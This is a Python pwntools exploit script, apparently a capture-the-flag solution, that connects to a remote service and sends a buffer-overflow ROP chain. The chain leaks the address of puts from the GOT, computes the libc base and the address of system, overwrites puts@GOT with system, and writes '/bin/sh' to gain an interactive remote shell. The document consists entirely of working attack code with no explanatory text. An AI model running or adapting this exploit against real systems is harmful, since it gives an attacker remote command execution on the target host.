from pwn import *


r = remote("exp.zip", 56005)



'''
0x0000000000401263 : pop rdi ; ret
'''

puts_got =p64(0x403368)
puts_off = 0x80ed0
sys_off = 0x50d60

gets_plt = p64(0x401090)
puts_plt = p64(0x401070)
mem_adder  = p64(0x403000)
poprdi = p64(0x401263)


r.recvuntil(b"best :")

w2m = poprdi 
w2m += mem_adder
w2m += gets_plt

rop = poprdi
rop += puts_got  # 1. puts(puts_got) 2. 改puts@got

rop2 = poprdi
rop2 += mem_adder  

payload = b'A'*40 + w2m + rop + puts_plt + rop + gets_plt  + rop2 + puts_plt



r.sendline(payload)

r.sendline(b'/bin/sh')

r.recvuntil(b'!\n')

puts_addr = r.recvline().split(b'\n')[0]



puts_addr = hex(int.from_bytes(puts_addr, byteorder='little'))

base = int(puts_addr, 16) - puts_off

sys_addr = base + sys_off


payload2 = p64(sys_addr)

r.sendline(payload2)

r.interactive()

